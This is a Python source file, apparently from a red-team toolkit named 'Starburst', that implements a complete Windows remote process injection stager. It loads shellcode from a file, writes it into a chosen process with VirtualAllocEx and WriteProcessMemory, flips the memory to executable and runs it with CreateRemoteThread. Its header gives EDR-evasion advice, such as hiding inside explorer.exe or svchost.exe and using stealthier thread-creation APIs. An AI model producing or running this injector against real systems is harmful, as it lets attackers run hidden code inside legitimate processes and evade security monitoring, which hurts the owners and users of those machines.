"""
============================================================================
Starburst Python Stager - Remote Process Injection
============================================================================
Technique:  OpenProcess + VirtualAllocEx + WriteProcessMemory +
            VirtualProtectEx + CreateRemoteThread
Usage:      python stager_inject.py <shellcode.bin> <PID>
OPSEC Notes:
    - Remote process injection is heavily monitored by EDR.
    - OpenProcess with PROCESS_ALL_ACCESS is a strong indicator.
    - Cross-process memory allocation (VirtualAllocEx) is suspicious.
    - WriteProcessMemory into a remote process triggers alerts.
    - CreateRemoteThread is one of the most monitored injection APIs.
    - Choose a target process that normally has many threads (explorer.exe,
      svchost.exe) to blend in.
    - Injecting into a process owned by a different user will fail without
      appropriate privileges (SeDebugPrivilege).
    - Consider NtCreateThreadEx or QueueUserAPC for stealthier execution.
    - The target process must match the shellcode architecture (x64/x86).
============================================================================
"""

import sys
import ctypes
import ctypes.wintypes as wintypes

# Constants
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PROCESS_ALL_ACCESS = 0x001FFFFF
INFINITE = 0xFFFFFFFF

# kernel32 function prototypes
kernel32 = ctypes.windll.kernel32

# OpenProcess
kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwProcessId
]
kernel32.OpenProcess.restype = wintypes.HANDLE

# VirtualAllocEx
kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,   # hProcess
    wintypes.LPVOID,   # lpAddress
    ctypes.c_size_t,   # dwSize
    wintypes.DWORD,    # flAllocationType
    wintypes.DWORD,    # flProtect
]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID

# WriteProcessMemory
kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                   # hProcess
    wintypes.LPVOID,                   # lpBaseAddress
    wintypes.LPCVOID,                  # lpBuffer
    ctypes.c_size_t,                   # nSize
    ctypes.POINTER(ctypes.c_size_t),   # lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

# VirtualProtectEx
kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                   # hProcess
    wintypes.LPVOID,                   # lpAddress
    ctypes.c_size_t,                   # dwSize
    wintypes.DWORD,                    # flNewProtect
    ctypes.POINTER(wintypes.DWORD),    # lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL

# CreateRemoteThread
kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                   # hProcess
    wintypes.LPVOID,                   # lpThreadAttributes
    ctypes.c_size_t,                   # dwStackSize
    wintypes.LPVOID,                   # lpStartAddress
    wintypes.LPVOID,                   # lpParameter
    wintypes.DWORD,                    # dwCreationFlags
    ctypes.POINTER(wintypes.DWORD),    # lpThreadId
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

# WaitForSingleObject
kernel32.WaitForSingleObject.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

# CloseHandle
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> <target_PID>")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    try:
        target_pid = int(sys.argv[2])
    except ValueError:
        print("Error: PID must be an integer")
        sys.exit(1)

    # Read shellcode from file
    try:
        with open(shellcode_path, "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: File not found: {shellcode_path}")
        sys.exit(1)
    except IOError as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

    if not shellcode:
        print("Error: Shellcode file is empty")
        sys.exit(1)

    sc_length = len(shellcode)

    # Open target process
    process_handle = kernel32.OpenProcess(
        PROCESS_ALL_ACCESS,
        False,
        target_pid,
    )

    if not process_handle:
        print(f"Error: OpenProcess failed for PID {target_pid} (error {ctypes.GetLastError()})")
        print("Ensure the target process exists and you have sufficient privileges.")
        sys.exit(1)

    try:
        # Allocate RW memory in the target process
        remote_address = kernel32.VirtualAllocEx(
            process_handle,
            None,
            sc_length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )

        if not remote_address:
            print(f"Error: VirtualAllocEx failed (error {ctypes.GetLastError()})")
            sys.exit(1)

        # Write shellcode to remote process memory
        shellcode_buffer = ctypes.create_string_buffer(shellcode)
        bytes_written = ctypes.c_size_t(0)
        result = kernel32.WriteProcessMemory(
            process_handle,
            remote_address,
            shellcode_buffer,
            sc_length,
            ctypes.byref(bytes_written),
        )

        if not result:
            print(f"Error: WriteProcessMemory failed (error {ctypes.GetLastError()})")
            sys.exit(1)

        if bytes_written.value != sc_length:
            print(f"Warning: Only wrote {bytes_written.value}/{sc_length} bytes")

        # Clear shellcode from local Python memory
        ctypes.memset(ctypes.addressof(shellcode_buffer), 0, sc_length)
        del shellcode

        # Flip remote memory protection from RW to RX
        old_protect = wintypes.DWORD(0)
        result = kernel32.VirtualProtectEx(
            process_handle,
            remote_address,
            sc_length,
            PAGE_EXECUTE_READ,
            ctypes.byref(old_protect),
        )

        if not result:
            print(f"Error: VirtualProtectEx failed (error {ctypes.GetLastError()})")
            sys.exit(1)

        # Create remote thread in target process
        thread_id = wintypes.DWORD(0)
        thread_handle = kernel32.CreateRemoteThread(
            process_handle,
            None,
            0,
            remote_address,
            None,
            0,
            ctypes.byref(thread_id),
        )

        if not thread_handle:
            print(f"Error: CreateRemoteThread failed (error {ctypes.GetLastError()})")
            sys.exit(1)

        # Wait for remote thread
        kernel32.WaitForSingleObject(thread_handle, INFINITE)
        kernel32.CloseHandle(thread_handle)

    finally:
        kernel32.CloseHandle(process_handle)


if __name__ == "__main__":
    main()
